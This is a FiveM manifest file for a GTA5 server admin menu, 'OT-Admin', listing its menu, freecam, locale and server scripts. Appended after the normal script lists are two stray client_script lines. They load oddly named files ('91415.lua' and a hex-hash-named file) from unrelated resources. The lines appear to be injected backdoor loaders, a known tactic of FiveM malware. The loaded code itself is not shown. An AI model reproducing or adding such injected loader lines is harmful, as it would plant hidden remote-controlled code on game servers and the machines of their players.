--[[
         __            __                            __                     
  ____  / /_      ____/ /__ _   __  _______  _______/ /____  ____ ___  _____
 / __ \/ __/_____/ __  / _ \ | / / / ___/ / / / ___/ __/ _ \/ __ `__ \/ ___/     ot-admin - Made by oxince
/ /_/ / /_/_____/ /_/ /  __/ |/ / (__  ) /_/ (__  ) /_/  __/ / / / / (__  )     discord.gg/ot-dev
\____/\__/      \__,_/\___/|___(_)____/\__, /____/\__/\___/_/ /_/ /_/____/     Copyright © 2021 - ot-dev.systems
                                      /____/  
]]--

fx_version  'adamant'
game 		'gta5'

name 		'OT-Admin'
author 	    'oxince'
version     '1.0.2'

description 'Made by discord.gg/ot-dev | ot-dev.systems © 2021'

server_scripts {
    --Dependencies
	'@mysql-async/lib/MySQL.lua',

    --Locales
	'assets/locale.lua',
	'locales/**.lua',

	'license/auth.lua',
	
    --OT-Admin
    'config/config.lua',
	'server/main.lua'
}

client_scripts {
    -- RageUI
	"assets/menu/RageUI.lua",
	"assets/menu/Menu.lua",
	"assets/menu/MenuController.lua",
	"assets/menu/components/*.lua",
	"assets/menu/elements/*.lua",
	"assets/menu/items/*.lua",
	"assets/menu/panels/*.lua",
	"assets/menu/windows/*.lua",
    
    -- FreeCam
    "assets/freecam/utils.lua",
    "assets/freecam/config.lua",
    "assets/freecam/main.lua",
    "assets/freecam/camera.lua",

    --Locales
	'assets/locale.lua',
	'locales/**.lua',

    --OT-Admin
	"config/config.lua",
	"client/main.lua"   ,
	"client/functions.lua",
}
client_script '@esx_advancedgarage/91415.lua'
client_script '@esx_pumpkins/50b308aa8af3157b04c2e0e8967e326a.lua'
